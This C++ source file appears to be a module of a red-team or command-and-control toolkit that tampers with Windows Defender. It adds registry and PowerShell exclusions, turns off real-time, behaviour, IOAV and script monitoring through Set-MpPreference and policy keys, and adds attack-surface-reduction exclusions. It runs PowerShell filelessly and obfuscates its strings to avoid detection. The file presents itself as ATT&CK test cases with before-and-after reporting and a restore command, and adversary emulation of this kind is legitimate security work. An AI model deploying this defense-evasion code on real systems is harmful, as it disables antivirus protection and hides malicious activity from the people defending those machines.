// defender.cpp — Windows Defender tampering test cases + posture reporting.
//
// Roadmap item "Defender exclusion/tampering, advanced". Every action is a
// documented ATT&CK test case (T1562.001), and every action answers with the
// Defender posture *before and after* so the experiment records what changed
// rather than what was attempted. The posture read itself is a technique
// (T1518.001, security software discovery) with its own rule.
//
// Vectors, matching the detection layer one-for-one:
//   exclusions   registry (Exclusions\Paths|Processes|Extensions)
//                + cmdlet (Add-MpPreference -ExclusionPath|-ExclusionProcess
//                  |-ExclusionExtension)                       -> EID 13 / EID 1
//   monitoring   cmdlet (Set-MpPreference -DisableRealtimeMonitoring and
//                friends) + policy keys under Policies\Microsoft\Windows
//                Defender                                     -> EID 1 / EID 13
//   ASR          Add-MpPreference -AttackSurfaceReductionOnlyExclusions -> EID 1
//   posture      Get-MpComputerStatus / Get-MpPreference      -> EID 1 (T1518.001)
//
// Non-destructive by construction: nothing here touches quarantine, signatures
// or the Defender install, and `restore` really restores. On Windows 10/11 with
// tamper protection enabled, most of these writes are *rejected* — that is a
// first-class result of the experiment, reported as `blocked`, not swallowed as
// an error. README section 18 says so where the limits are listed.
#include "defender.hpp"

#include <windows.h>          // before config.hpp: it declares DWORD-typed constants

#include "config.hpp"
#include "utils.hpp"
#include "obfuscate.hpp"

#include <string>
#include <vector>

namespace {

// ── small helpers ───────────────────────────────────────────────────────────
std::wstring Trim(const std::wstring& s) {
    size_t a = s.find_first_not_of(L" \t\r\n");
    if (a == std::wstring::npos) return {};
    size_t b = s.find_last_not_of(L" \t\r\n");
    return s.substr(a, b - a + 1);
}

// PowerShell single-quoted string literal: only ' needs doubling.
std::wstring PsQuote(const std::wstring& v) {
    std::wstring out = L"'";
    for (wchar_t c : v) {
        out += c;
        if (c == L'\'') out += L'\'';
    }
    out += L"'";
    return out;
}

std::wstring RunPs(const std::wstring& script) {
    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(script.c_str()),
                                   script.size() * sizeof(wchar_t));
    return RunFilelessPS(b64);
}

// One-line posture read: state + preferences as compact JSON. Kept in one
// Get-* pipeline pair so the whole posture arrives in a single process start.
std::wstring PostureJson() {
    auto script = XSW(
        L"$ErrorActionPreference='SilentlyContinue';"
        L"$s=Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,"
        L"BehaviorMonitorEnabled,IoavProtectionEnabled,OnAccessProtectionEnabled,IsTamperProtected,"
        L"AntivirusSignatureAge,AMServiceEnabled,AntispywareEnabled;"
        L"$p=Get-MpPreference | Select-Object DisableRealtimeMonitoring,DisableBehaviorMonitoring,"
        L"DisableIOAVProtection,DisableScriptScanning,ExclusionPath,ExclusionProcess,"
        L"ExclusionExtension,AttackSurfaceReductionOnlyExclusions;"
        L"[pscustomobject]@{status=$s;preferences=$p} | ConvertTo-Json -Compress -Depth 4");
    std::wstring out = Trim(RunPs(script.str()));
    if (out.empty()) out = L"{}";
    return out;
}

// ── registry vectors ────────────────────────────────────────────────────────
// Key paths are XSW-wrapped like every other toolkit string (the CI tripwire
// scans the release artifact for surviving plaintext).
std::wstring ExclKeyFor(const std::wstring& kind) {
    if (kind == L"path")
        return XSW(L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths").str();
    if (kind == L"proc")
        return XSW(L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes").str();
    if (kind == L"ext")
        return XSW(L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions").str();
    return {};
}

// Returns a short status token: ok | needs-elevation | failed:<code>.
std::wstring RegistryExclusion(const std::wstring& kind, const std::wstring& value,
                               bool add) {
    std::wstring key = ExclKeyFor(kind);
    if (key.empty()) return L"unknown-kind";
    if (!IsElevated()) return L"needs-elevation";

    HKEY hKey = nullptr;
    DWORD disp = 0;
    LONG rc;
    if (add) {
        rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, key.c_str(), 0, nullptr,
                             REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | KEY_WOW64_64KEY,
                             nullptr, &hKey, &disp);
        if (rc != ERROR_SUCCESS) return L"failed:" + std::to_wstring(rc);
        DWORD zero = 0;   // value presence is what Defender reads; data is ignored
        rc = RegSetValueExW(hKey, value.c_str(), 0, REG_DWORD,
                            reinterpret_cast<const BYTE*>(&zero), sizeof(zero));
    } else {
        rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, key.c_str(), 0,
                           KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey);
        if (rc != ERROR_SUCCESS) return L"failed:" + std::to_wstring(rc);
        rc = RegDeleteValueW(hKey, value.c_str());
    }
    RegCloseKey(hKey);
    return rc == ERROR_SUCCESS ? std::wstring(L"ok")
                               : std::wstring(L"failed:") + std::to_wstring(rc);
}

// Policy keys: the "disable" vector that does not go through PowerShell.
// "key|value", both XSW-wrapped.
std::wstring PolicySpecFor(const std::wstring& vector) {
    if (vector == L"realtime")
        return XSW(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection|DisableRealtimeMonitoring").str();
    if (vector == L"behavior")
        return XSW(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection|DisableBehaviorMonitoring").str();
    if (vector == L"onaccess")
        return XSW(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection|DisableOnAccessProtection").str();
    if (vector == L"scan")
        return XSW(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection|DisableScanOnRealtimeEnable").str();
    if (vector == L"antispy")
        return XSW(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender|DisableAntiSpyware").str();
    return {};
}

// Same status vocabulary as RegistryExclusion. set=true writes 1, false deletes.
std::wstring PolicyWrite(const std::wstring& vector, bool set) {
    std::wstring spec = PolicySpecFor(vector);
    if (spec.empty()) return L"unknown-vector";
    if (!IsElevated()) return L"needs-elevation";

    size_t bar = spec.find(L'|');
    std::wstring key = spec.substr(0, bar), value = spec.substr(bar + 1);

    HKEY hKey = nullptr;
    LONG rc;
    if (set) {
        rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, key.c_str(), 0, nullptr,
                             REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | KEY_WOW64_64KEY,
                             nullptr, &hKey, nullptr);
        if (rc != ERROR_SUCCESS) return L"failed:" + std::to_wstring(rc);
        DWORD one = 1;
        rc = RegSetValueExW(hKey, value.c_str(), 0, REG_DWORD,
                            reinterpret_cast<const BYTE*>(&one), sizeof(one));
        RegCloseKey(hKey);
    } else {
        rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, key.c_str(), 0,
                           KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey);
        if (rc == ERROR_SUCCESS) {
            rc = RegDeleteValueW(hKey, value.c_str());
            RegCloseKey(hKey);
            if (rc == ERROR_FILE_NOT_FOUND) rc = ERROR_SUCCESS;   // already absent
        }
    }
    return rc == ERROR_SUCCESS ? std::wstring(L"ok")
                               : std::wstring(L"failed:") + std::to_wstring(rc);
}

// ── cmdlet vectors ──────────────────────────────────────────────────────────
std::wstring PsExclusion(const std::wstring& kind, const std::wstring& value, bool add) {
    std::wstring param;
    if      (kind == L"path") param = XSW(L"-ExclusionPath").str();
    else if (kind == L"proc") param = XSW(L"-ExclusionProcess").str();
    else if (kind == L"ext")  param = XSW(L"-ExclusionExtension").str();
    else return L"unknown-kind";

    std::wstring script = std::wstring(add ? XSW(L"Add-MpPreference ").str()
                                           : XSW(L"Remove-MpPreference ").str())
                          + param + L" " + PsQuote(value)
                          + XSW(L" -ErrorAction Stop; 'ok'").str();
    std::wstring out = Trim(RunPs(script));
    return out.empty() ? L"ok" : out;    // PS errors land in the captured stream
}

std::wstring PsAsr(const std::wstring& path, bool add) {
    std::wstring script =
        std::wstring(add ? XSW(L"Add-MpPreference ").str()
                         : XSW(L"Remove-MpPreference ").str())
        + XSW(L"-AttackSurfaceReductionOnlyExclusions ").str() + PsQuote(path)
        + XSW(L" -ErrorAction Stop; 'ok'").str();
    std::wstring out = Trim(RunPs(script));
    return out.empty() ? L"ok" : out;
}

std::wstring PsDisable(const std::vector<std::wstring>& vectors, bool on) {
    std::wstring set = on ? XSW(L"$true").str() : XSW(L"$false").str();
    std::wstring cmd = XSW(L"Set-MpPreference ").str();
    for (const auto& v : vectors) {
        if      (v == L"realtime") cmd += XSW(L"-DisableRealtimeMonitoring ").str();
        else if (v == L"behavior") cmd += XSW(L"-DisableBehaviorMonitoring ").str();
        else if (v == L"ioav")     cmd += XSW(L"-DisableIOAVProtection ").str();
        else if (v == L"script")   cmd += XSW(L"-DisableScriptScanning ").str();
        else return L"unknown-vector";
        cmd += set + L" ";
    }
    cmd += XSW(L"-ErrorAction Stop; 'ok'").str();
    std::wstring out = Trim(RunPs(cmd));
    return out.empty() ? L"ok" : out;
}

// ── report assembly ─────────────────────────────────────────────────────────
std::wstring Report(const std::wstring& action, const std::wstring& before,
                    const std::wstring& result, const std::wstring& after,
                    const std::wstring& note) {
    std::wstring out = L"[defender] action: " + action + L"\r\n"
                       L"[defender] result: " + (result.empty() ? L"ok" : result) + L"\r\n"
                       L"[defender] before: " + (before.empty() ? L"{}" : before) + L"\r\n"
                       L"[defender] after: " + (after.empty() ? L"{}" : after);
    if (!note.empty()) out += L"\r\n[defender] note: " + note;
    return out;
}

// Inference the operator should not have to do by eye: if a disable was
// attempted and real-time protection still reads enabled, say who won.
std::wstring PostActionNote(const std::string& args, const std::wstring& result,
                            const std::wstring& after) {
    if (args.find("disable") != std::string::npos &&
        result.find(L"needs-elevation") == std::wstring::npos) {
        if (after.find(L"\"RealTimeProtectionEnabled\":true") != std::wstring::npos ||
            after.find(L"\"RealTimeProtectionEnabled\": true") != std::wstring::npos)
            return L"real-time protection still enabled after the attempt — tamper "
                   L"protection or policy is overriding; the write itself is the telemetry";
    }
    if (result.find(L"needs-elevation") != std::wstring::npos)
        return L"run elevated: registry/policy vectors need an administrator token";
    return {};
}

}  // namespace

std::wstring HandleDefender(const std::string& args) {
    std::wstring a = Trim(UTF8ToWString(args));
    if (a.empty() || a == L"status") {
        return L"[defender] posture:\r\n" + PostureJson();
    }

    // Split "verb kind value": the value is the rest of the line, spaces allowed.
    size_t s1 = a.find(L' ');
    std::wstring verb = (s1 == std::wstring::npos) ? a : a.substr(0, s1);
    std::wstring rest = (s1 == std::wstring::npos) ? L"" : Trim(a.substr(s1 + 1));

    auto split = [&](std::wstring& first, std::wstring& value) {
        size_t sp = rest.find(L' ');
        first = (sp == std::wstring::npos) ? rest : rest.substr(0, sp);
        value = (sp == std::wstring::npos) ? L"" : Trim(rest.substr(sp + 1));
    };

    if (verb == L"exclude") {
        std::wstring action, kind_value;
        split(action, kind_value);
        std::wstring kind, value;
        size_t sp = kind_value.find(L' ');
        kind  = (sp == std::wstring::npos) ? kind_value : kind_value.substr(0, sp);
        value = (sp == std::wstring::npos) ? L"" : Trim(kind_value.substr(sp + 1));
        if (kind.empty() || value.empty())
            return L"Usage: !defender exclude <add|remove|ps-add|ps-remove> "
                   L"<path|proc|ext> <value>";

        std::wstring before = PostureJson();
        std::wstring result;
        if      (action == L"add")       result = RegistryExclusion(kind, value, true);
        else if (action == L"remove")    result = RegistryExclusion(kind, value, false);
        else if (action == L"ps-add")    result = PsExclusion(kind, value, true);
        else if (action == L"ps-remove") result = PsExclusion(kind, value, false);
        else return L"Usage: !defender exclude <add|remove|ps-add|ps-remove> "
                    L"<path|proc|ext> <value>";

        std::wstring after = PostureJson();
        return Report(L"exclude " + action + L" " + kind + L" " + value, before,
                      result, after, PostActionNote("exclude", result, after));
    }

    if (verb == L"disable") {
        std::wstring vec = rest;
        std::vector<std::wstring> vectors;
        if (vec.empty()) return L"Usage: !defender disable <realtime|behavior|ioav|script|all>";
        if (vec == L"all") vectors = { L"realtime", L"behavior", L"ioav", L"script" };
        else vectors = { vec };
        for (const auto& v : vectors)
            if (v != L"realtime" && v != L"behavior" && v != L"ioav" && v != L"script")
                return L"Usage: !defender disable <realtime|behavior|ioav|script|all>";

        std::wstring before = PostureJson();
        std::wstring ps  = PsDisable(vectors, true);
        std::wstring pol;
        for (const auto& v : vectors) {
            std::wstring r = PolicyWrite(v, true);
            pol += (pol.empty() ? L"" : L", ") + v + L"=" + r;
        }
        std::wstring result = L"set-mppreference: " + ps + L"; policy: " + pol;
        std::wstring after = PostureJson();
        return Report(L"disable " + vec, before, result, after,
                      PostActionNote("disable", result, after));
    }

    if (verb == L"asr") {
        std::wstring action, value;
        split(action, value);
        if (value.empty() || (action != L"add" && action != L"remove"))
            return L"Usage: !defender asr <add|remove> <path>";
        std::wstring before = PostureJson();
        std::wstring result = PsAsr(value, action == L"add");
        std::wstring after = PostureJson();
        return Report(L"asr " + action + L" " + value, before, result, after,
                      PostActionNote("asr", result, after));
    }

    if (verb == L"restore") {
        std::wstring before = PostureJson();
        std::wstring ps = PsDisable({ L"realtime", L"behavior", L"ioav", L"script" }, false);
        std::wstring pol;
        for (const wchar_t* name : { L"realtime", L"behavior", L"onaccess", L"scan", L"antispy" }) {
            std::wstring r = PolicyWrite(name, false);
            pol += (pol.empty() ? L"" : L", ") + std::wstring(name) + L"=" + r;
        }
        std::wstring result = L"set-mppreference: " + ps + L"; policy-cleared: " + pol;
        std::wstring after = PostureJson();
        return Report(L"restore", before, result, after,
                      L"re-enables monitoring and removes the policy values this module "
                      L"sets; exclusions were never removed implicitly — use exclude remove");
    }

    return L"Usage: !defender <status|exclude|disable|asr|restore>\r\n"
           L"  !defender status\r\n"
           L"  !defender exclude <add|remove|ps-add|ps-remove> <path|proc|ext> <value>\r\n"
           L"  !defender disable <realtime|behavior|ioav|script|all>\r\n"
           L"  !defender asr <add|remove> <path>\r\n"
           L"  !defender restore";
}
